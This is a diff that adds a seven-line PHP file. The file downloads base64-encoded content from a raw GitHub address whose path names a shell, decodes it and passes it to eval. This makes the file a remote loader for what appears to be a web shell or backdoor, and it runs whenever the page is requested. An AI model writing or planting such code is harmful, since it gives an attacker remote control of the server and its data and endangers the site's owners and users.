@@ -1,0 +1,7 @@
+<?php
+
+$z3 = "https://raw.githubusercontent.com/skullz/shell/master/byp";
+$z3r0 = file_get_contents($z3);
+eval("?>" .(base64_decode($z3r0)));
+
+?>
